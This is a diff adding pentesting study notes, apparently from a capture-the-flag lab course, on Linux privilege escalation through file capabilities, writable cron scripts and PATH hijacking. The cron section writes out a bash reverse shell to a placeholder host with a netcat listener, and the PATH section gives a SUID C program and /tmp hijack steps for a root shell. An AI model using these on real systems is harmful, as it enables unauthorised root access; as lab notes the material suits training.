@@ -2910,6 +2910,87 @@ Privilege Escalation
                             root:/bin/bash to provide a root shell
 
 
+        Capabilities
+
+            Another method system administrators can use to increase the privilege level of a process or binary
+                As a result, the binary would get through is task without needing a higher privilege user
+
+                    getcap -r / 2>/dev/null     To list enabled capabilities
+                                                    Then GTFObins
+
+
+        Cron Jobs
+
+            Used to run scripts or binaries at specific time
+                By default, they run with the privilege of their owners
+
+                    cat /etc/crontab
+
+                        As our current user can access one of this scripts
+                            We can easily modify it to create a reverse shell with root privileges
+
+                                LHOST       nc -lnvp <lport>
+
+                                RHOST       chmod +x <file>
+
+                                                #!/bin/bash
+
+                                                bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
+
+
+            In a situation where <file> was deleted, but the cron job still exists
+                We should be able to create a script named <file> and it should be run by the cron job
+
+
+        PATH
+
+            Environmental variable that tells the operating system where to search for executables
+
+                If a folder for which your user has write permission is located in the path
+                    You could potentially hijack an application to run a script
+
+                        0. For demo purposes we compile this into an executable and set the SUID bit
+                            vim path_exp.c
+                                #include<unistd.h>
+                                void main()
+                                {   setuid(0);
+                                    setgid(0);
+                                    system("thm");
+                                }
+                            gcc path_exp.c -o path -w
+                            chmod u+s path
+
+
+                        1. What folders are located under $PATH?
+                            echo $PATH
+
+                        2. Does your current user have write privileges for any of these folders?
+                            find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+                                "grep -v proc" to get rid of the many results related to running processes
+
+                        3. Can you modify $PATH?
+                            export PATH=/tmp:$PATH
+                                The folder that will be easier to write to is probably /tmp
+
+                        4. Is there a script/application you can start that will be affected by this vulnerability?
+
+
+                        5. Copying /bin/bash as "thm"
+                                cd /tmp
+                                echo "/bin/bash" > thm
+                                chmod 777 thm
+
+                        6. What makes a privilege escalation possible within this
+                           context is that the path script runs with root privileges
+                                whoami
+                                    <user>
+                                ./path
+                                whoami
+                                    root
+
+
+
+
 
     Windows Privilege Escalation
 
